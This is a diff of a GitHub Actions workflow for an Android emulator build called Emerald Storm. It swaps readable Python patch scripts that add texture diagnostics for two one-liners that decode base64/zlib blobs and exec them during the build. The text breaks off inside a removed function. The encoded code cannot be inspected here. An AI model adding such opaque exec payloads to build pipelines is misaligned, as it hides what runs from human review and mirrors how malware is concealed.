@@ -1,5 +1,5 @@
-# FIX4 VERIFICADO: Emerald Storm v0.2.40 Phase8 Storm4 BlackBox Forensics
-name: Emerald Storm v0.2.40 FIX4 CAM Phase8 Storm4 BlackBox Forensics + Full Diagnostics + PT-BR
+# Emerald Storm v0.2.41 Phase9 Storm4 Attachment Feedback Loop Fix
+name: Emerald Storm v0.2.41 CAM Phase9 Storm4 Attachment Feedback Loop Fix + PT-BR
 
 on:
   workflow_dispatch:
@@ -7,20 +7,17 @@ on:
     branches: [ main ]
 
 concurrency:
-  group: emerald-phase8-${{ github.ref }}
+  group: emerald-phase9-${{ github.ref }}
   cancel-in-progress: true
 
 env:
-  ES_VERSION: v0.2.40-FIX4-CAM-Phase8-Storm4-BlackBox-Forensics-Full-Diagnostics-Full-PTBR
+  ES_VERSION: v0.2.41-CAM-Phase9-Storm4-Attachment-Feedback-Loop-Fix-Full-PTBR
   ES_SOURCE_DIR: EmeraldStorm-v0.1.0
-  V239_COMMIT: ca15dc208beb65a61a163ecd1e44eb7148992797
-  V238_COMMIT: c3ff99dcebb7b958ca44a2437491a32b53dafc6c
-  V237_COMMIT: dfafe68a823d4fa12a043641a430ba1e44417a42
-  V235_COMMIT: af569dd75cc1b9ed0fe679c467a0c702e3b0bf9c
+  V240_COMMIT: 616df95da30cdabbdaa9ad3c51e424e0572e0445
 
 jobs:
   android:
-    name: Build Emerald Storm v0.2.40 FIX4 CAM Phase8 Storm4 BlackBox
+    name: Build Emerald Storm v0.2.41 CAM Phase9 Storm4 Feedback Loop
     runs-on: ubuntu-22.04
     timeout-minutes: 120
 
@@ -39,452 +36,44 @@ jobs:
       - name: Set up Android SDK
         uses: android-actions/setup-android@v3
 
-      - name: Reconstruct proven v0.2.39 Action82 source exactly
+      - name: Reconstruct proven v0.2.40 FIX4 Phase8 source exactly
         run: |
           set -euo pipefail
-          git show "${V239_COMMIT}:.github/workflows/bootstrap-build.yml" > /tmp/emerald-v239.yml
-          test -s /tmp/emerald-v239.yml
-          python3 - <<'PYREPLAY'
-          from __future__ import annotations
-          import os, re, subprocess
-          from pathlib import Path
+          git show "${V240_COMMIT}:.github/workflows/bootstrap-build.yml" > /tmp/emerald-v240.yml
+          test -s /tmp/emerald-v240.yml
+          python3 -c "import base64,zlib;exec(compile(zlib.decompress(base64.b64decode('eNqNVmlv4zYQ/a5fwaYLUGos2UlTNDUaFNms0y6yaIJkF9vCcQ0dlMNYIgWSsmOk+e+dISVLzoGtAdsgNcebN5dyJUsyn+e1qRWbzwkvK6kMiYWQJjZcCu01V1IPiGIDouukUjJlWns5KlexuSt40mpewdHzri8vP5MTe4jSdeYHkWJaFivmB97Xy+uL80+XX5vnPh2ashqykqm4yMLV4dEo2pQFDbybyy/XZ5P5h4/XICp1xMSKKymmdHIz757RmVdwwTTItJbBWZzNDXsw4FhXBTdWAnxrEyuDotOZl0tF+IDgI8IFYaJGCIb5VjgYewQ+JcgqFpWxSe98Rf8h9hMSEZdsfKt/8KP93wL4f0edpcBq8ZyUTh8/zmkUVxUTme+DzzJaKFlX/gHAM4pXPt27pTQIAs9TtZhrw6oeyAqp962VgXUc7OJ19hvA4AI03dUUNMk+OZhNRzPE1BzJr6RgolUjrNDMXri4rZWkkOkS7NirqZUcg+VZGx2iICcnhL6veZGRiUseuTFSleT06oJ20SeQjKU9raVaZlyB2T+lYPYKo41N/wYDvn8tKxZS0Nl9PTPOCxeLEDyxFPBs3k7Ty1TtwnwjTX3d1xBAUOjz9t++w10f27jvd647rtC0k+HaktPpp1IYLmpHl04Bl5m3HTCdbUlsGbS8TRtjkP3xbNwPAMUiVwprjt3YoaHPQPd9tdWMh+nBaDzrWGEFFog0rWkk7n9Y6hOLJTl+g5ltg2wbCotx0KZtQOitoNG95FDhPTcBxI5PsMcafF2rAV3bA/QKtst3UNzXDLiGAOrUEJh5KybIahQdRj/+Qk5THI7Hh0TLWqWMsIc4NcWmqXsVc+ipmw0YLCcP3PjU6h2NoF6qIt7A0FSaKZLxzCLJOXQte6igYFkGJ6UtOoKAgJamGBy88GCL7/zjX0cOGFkwYdskI2f7+yRhUAEMKqWseGHH+FvA8jeQAbFgCyqmFltc6H9MHl9A6cNz02RPQMXuPQF0L2PYJHb2z5sU+SpeNwXRZiJed+lWDHaRILhC3ER7qNRcQqqhvuk7inl8fKSu+i35c5SAh50giEAEq2hnUZCnJ9qQsMbZEa8jG3MKE7SzMyCdxnaYd5ahoXbBvsj0F6HrClchMPY7N3/UiVWHfQlpsPqO6IaMMcGIkBGvF7xvF+jQ3vdWp10HMBETBjif172r9me7YZuYATloOId9bEfnbk6af4eiUlxgbdyK6eQmvJ5cfTr9G/byjDw65+PRYfY0fMSlsXUQPMFTQPQEEy8van138lnVzaDt3hkikPenNIn1HcjRkNnf2v5K/K14xfKYF/YmpW1YswHiPoHvADN70r0ORKmsNn4Az+9YumycegsVZwWsKNIQ2SuDIaEwOYYJbq7IyVEvkdkGpN2x//6AzUdXTGH2zmTGyE8jamsWRysqQUaoa6Ewjcuwuos1Ow41bsKjMIHyWibyIcR+FJqnOszrooDlFC+E1AYvKpOoHZPfniHbsYQl1YDDf57z1LY7QQpZBg2YshTi8t+kQat0WMZcDFM8LDc4LIeLqh5CBTAFjgQ0/xAmSRmLDDqEpTWEFoE0DV7whNVycxSeTyYf3p+eXcy2YQGKb0WVM5YlwFZYSFmRli8cbxJWNIf2EQuIx5UmfVaXrRE7EZuR3KMJh6p9V3VD3A1v8v3xz7Z78kKuwfJ/pwN0cw==')), '<replay>', 'exec'))"
 
-          ROOT = Path.cwd().resolve()
-          WORKFLOW = Path('/tmp/emerald-v239.yml')
-          SOURCE_DIR = os.environ['ES_SOURCE_DIR']
-          lines = WORKFLOW.read_text().splitlines()
-          starts = []
-          for i, line in enumerate(lines):
-              m = re.match(r'^      - name:\s*(.+?)\s*$', line)
-              if m:
-                  starts.append((i, m.group(1).strip('"\'')))
-
-          run_steps = []
-          for pos, (start, name) in enumerate(starts):
-              end = starts[pos + 1][0] if pos + 1 < len(starts) else len(lines)
-              block = lines[start:end]
-              if name == 'Build Emerald Storm APK':
-                  break
-              workdir = None
-              run_at = None
-              for j, line in enumerate(block):
-                  m = re.match(r'^        working-directory:\s*(.+?)\s*$', line)
-                  if m:
-                      workdir = m.group(1).strip('"\'')
-                  if re.match(r'^        run:\s*\|\s*$', line):
-                      run_at = j
-                      break
-              if run_at is None:
-                  continue
-              script_lines = []
-              for line in block[run_at + 1:]:
-                  if line.startswith('          '):
-                      script_lines.append(line[10:])
-                  elif not line.strip():
-                      script_lines.append('')
-                  else:
-                      break
-              run_steps.append((name, workdir, '\n'.join(script_lines) + '\n'))
-
-          if not run_steps or run_steps[0][0] != 'Reconstruct proven v0.2.38 Action81 source exactly':
-              raise SystemExit('v0.2.39 replay parser did not find expected first run step')
-          if run_steps[-1][0] != 'CAM Phase7 regression safety audit':
-              raise SystemExit(f'v0.2.39 replay parser ended at unexpected step: {run_steps[-1][0] if run_steps else "none"}')
-
-          def resolve_workdir(raw):
-              if not raw:
-                  return ROOT
-              expr_open = '$' + '{{'
-              source_expr = expr_open + ' env.ES_SOURCE_DIR }}'
-              raw = raw.replace(source_expr, SOURCE_DIR)
-              if expr_open in raw:
-                  raise SystemExit('Unsupported GitHub expression in replay workdir: ' + raw)
-              return (ROOT / raw).resolve()
-
-          for number, (name, workdir, script) in enumerate(run_steps, 1):
-              cwd = resolve_workdir(workdir)
-              print(f'\n[ES-REPLAY239] {number:02d}/{len(run_steps)} {name}', flush=True)
-              subprocess.run(['bash', '-e', '-u', '-o', 'pipefail', '-c', script], cwd=cwd, env=os.environ.copy(), check=True)
-
-          gradle = ROOT / SOURCE_DIR / 'app/build.gradle'
-          body = gradle.read_text()
-          if 'versionCode 49' not in body or '0.2.39-cam-phase7-storm4-texture-forensics-tic-fix-settings-trace-ptbr' not in body:
-              raise SystemExit('v0.2.39 reconstruction version verification failed')
-          textures = (ROOT / SOURCE_DIR / 'app/src/main/cpp/skyline/gpu/interconnect/common/textures.cpp').read_text()
-          if '[ES-S4-TIC-CHANGE]' not in textures or 'STALE-REUSE-BLOCKED' not in textures:
-              raise SystemExit('v0.2.39 Phase7 forensic baseline missing')
-          print('[ES-REPLAY239] v0.2.39 source reconstructed from proven Action #82 workflow')
-          PYREPLAY
-
-      - name: Apply CAM Phase8 Storm4 black-box diagnostic battery
+      - name: Apply CAM Phase9 Storm4 attachment feedback loop correction
         working-directory: ${{ env.ES_SOURCE_DIR }}
         run: |
           set -euo pipefail
-          python3 - <<'PYPHASE8'
-          from pathlib import Path
-          import re
+          python3 -c "import base64,zlib;exec(compile(zlib.decompress(base64.b64decode('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')), '<patch>', 'exec'))"
 
-          root = Path('.')
-
-          def read(rel):
-              return (root/rel).read_text()
-
-          def write(rel, text):
-              (root/rel).write_text(text)
-
-          def replace_once(text, old, new, label):
-              c = text.count(old)
-              if c != 1:
-                  raise SystemExit(f'{label}: anchor count={c}, expected 1')
-              return text.replace(old, new, 1)
-
-          def replace_in_region(text, start_marker, end_marker, old, new, label):
-              start = text.find(start_marker)
-              if start < 0:
-                  raise SystemExit(f'{label}: start marker missing')
-              end = text.find(end_marker, start + len(start_marker))
-              if end < 0:
-                  raise SystemExit(f'{label}: end marker missing')
-              region = text[start:end]
-              c = region.count(old)
-              if c != 1:
-                  raise SystemExit(f'{label}: regional anchor count={c}, expected 1')
-              region = region.replace(old, new, 1)
-              return text[:start] + region + text[end:]
-
-          # -----------------------------------------------------------------------
-          # 0) Version identity.
-          # -----------------------------------------------------------------------
-          rel = 'app/build.gradle'
-          t = read(rel)
-          t, n1 = re.subn(r'versionCode\s+49\b', 'versionCode 50', t, count=1)
-          t, n2 = re.subn(
-              r'versionName\s+"0\.2\.39-cam-phase7-storm4-texture-forensics-tic-fix-settings-trace-ptbr"',
-              'versionName "0.2.40-cam-phase8-storm4-blackbox-forensics-full-diagnostics-ptbr"',
-              t, count=1)
-          if n1 != 1 or n2 != 1:
-              raise SystemExit(f'Phase8 version bump failed: code={n1}, name={n2}')
-          write(rel, t)
-
-          # -----------------------------------------------------------------------
-          # 1) Global Storm4 event clock + presented-frame clock.
-          # -----------------------------------------------------------------------
-          rel = 'app/src/main/cpp/skyline/gpu.h'
-          t = read(rel)
-          if '#include <atomic>\n' not in t:
-              if '#include <string>\n' in t:
-                  t = t.replace('#include <string>\n', '#include <atomic>\n#include <string>\n', 1)
-              else:
-                  raise SystemExit('gpu.h include anchor missing')
-          old = '''        std::string currentTitleId{};\n        bool storm4TextureForensics{};\n'''
-          new = '''        std::string currentTitleId{};\n        bool storm4TextureForensics{};\n        std::atomic<u64> storm4ForensicEvent{}; //!< Monotonic event id for cross-subsystem correlation\n        std::atomic<u64> storm4PresentFrame{}; //!< Number of frames actually presented by Android\n'''
-          t = replace_once(t, old, new, 'GPU Phase8 clocks')
-          write(rel, t)
-
-          # -----------------------------------------------------------------------
-          # 2) CommandExecutor exposes forensic gate/event/frame to engines such as DMA.
-          # -----------------------------------------------------------------------
-          rel = 'app/src/main/cpp/skyline/gpu/interconnect/command_executor.h'
-          t = read(rel)
-          anchor = '''        /** @return Selected DMA accuracy mode: 0 default, 1 unsafe/fast, 2 safe. */\n        u32 DmaAccuracy() const;\n\n'''
-          insert = anchor + '''        /** @return Whether Storm 4 black-box diagnostics are active for this title. */\n        bool Storm4TextureForensics() const;\n\n        /** @return A globally monotonic Storm 4 forensic event id. */\n        u64 NextStorm4ForensicEvent();\n\n        /** @return The latest frame index presented to Android. */\n        u64 Storm4PresentFrame() const;\n\n'''
-          t = replace_once(t, anchor, insert, 'CommandExecutor forensic declarations')
-          write(rel, t)
-
-          rel = 'app/src/main/cpp/skyline/gpu/interconnect/command_executor.cpp'
-          t = read(rel)
-          anchor = '''    u32 CommandExecutor::DmaAccuracy() const {\n        return *state.settings->dmaAccuracy;\n    }\n\n'''
-          insert = anchor + '''    bool CommandExecutor::Storm4TextureForensics() const {\n        return gpu.storm4TextureForensics;\n    }\n\n    u64 CommandExecutor::NextStorm4ForensicEvent() {\n        return gpu.storm4ForensicEvent.fetch_add(1, std::memory_order_relaxed) + 1;\n    }\n\n    u64 CommandExecutor::Storm4PresentFrame() const {\n        return gpu.storm4PresentFrame.load(std::memory_order_relaxed);\n    }\n\n'''
-          t = replace_once(t, anchor, insert, 'CommandExecutor forensic implementations')
-          write(rel, t)
-
-          # -----------------------------------------------------------------------
-          # 3) Texture and TextureView identities + content generations.
-          # -----------------------------------------------------------------------
-          rel = 'app/src/main/cpp/skyline/gpu/texture/texture.h'
-          t = read(rel)
-          old = '''        LockableSharedPtr<Texture> texture;\n        vk::ImageViewType type;\n        texture::Format format;\n        vk::ComponentMapping mapping;\n        vk::ImageSubresourceRange range;\n'''
-          new = '''        LockableSharedPtr<Texture> texture;\n        vk::ImageViewType type;\n        texture::Format format;\n        vk::ComponentMapping mapping;\n        vk::ImageSubresourceRange range;\n        u64 esViewId{}; //!< Stable Emerald forensic id for this exact TextureView object\n'''
-          t = replace_once(t, old, new, 'TextureView forensic id field')
-
-          old = '''        bool replaced{};\n'''
-          new = '''        bool replaced{};\n\n        // Emerald Storm Phase8 black-box metadata. These do not affect rendering decisions.\n        std::atomic<u64> esContentGeneration{};\n        std::atomic<u64> esLastSampledGeneration{~u64{0}};\n        std::atomic<u64> esLastWriteEvent{};\n        std::atomic<u32> esLastWriter{}; // 0 none, 1 CPU upload, 2 render target, 3 texture copy\n\n        /** @return Lightweight fingerprint of CPU-visible guest backing, or 0 when unavailable. */\n        u64 DebugGuestFingerprint() const;\n'''
-          t = replace_once(t, old, new, 'Texture forensic generation fields')
-          write(rel, t)
-
-          rel = 'app/src/main/cpp/skyline/gpu/texture/texture.cpp'
-          t = read(rel)
-          old = '''    TextureView::TextureView(std::shared_ptr<Texture> texture, vk::ImageViewType type, vk::ImageSubresourceRange range, texture::Format format, vk::ComponentMapping mapping) : texture(std::move(texture)), type(type), format(format), mapping(mapping), range(range) {}\n\n'''
-          new = '''    TextureView::TextureView(std::shared_ptr<Texture> texture, vk::ImageViewType type, vk::ImageSubresourceRange range, texture::Format format, vk::ComponentMapping mapping) : texture(std::move(texture)), type(type), format(format), mapping(mapping), range(range) {\n        static std::atomic<u64> esNextViewId{1};\n        esViewId = esNextViewId.fetch_add(1, std::memory_order_relaxed);\n    }\n\n    u64 Texture::DebugGuestFingerprint() const {\n        if (!guest || memoryFreed || !mirror.valid() || mirror.size() == 0)\n            return 0;\n\n        // Sample at most ~4096 bytes spread over the entire guest mirror. This gives us a\n        // useful content signature without hashing multi-megabyte textures on every upload.\n        constexpr u64 FnvOffset{1469598103934665603ULL};\n        constexpr u64 FnvPrime{1099511628211ULL};\n        const size_t sampleBudget{4096};\n        const size_t step{mirror.size() > sampleBudget ? (mirror.size() / sampleBudget) : 1};\n        u64 hash{FnvOffset ^ static_cast<u64>(mirror.size())};\n        for (size_t i{}; i < mirror.size(); i += step) {\n            hash ^= static_cast<u64>(mirror[i]);\n            hash *= FnvPrime;\n        }\n        return hash;\n    }\n\n'''
-          t = replace_once(t, old, new, 'TextureView id + guest fingerprint implementation')
-
-          # CPU -> host upload path. This only reaches SynchronizeHostImpl when CpuDirty really needs upload.
-          t = replace_in_region(
-              t,
-              '    void Texture::SynchronizeHost(bool gpuDirty) {\n',
-              '    void Texture::SynchronizeHostInline(',
-              '        auto stagingBuffer{SynchronizeHostImpl()};\n',
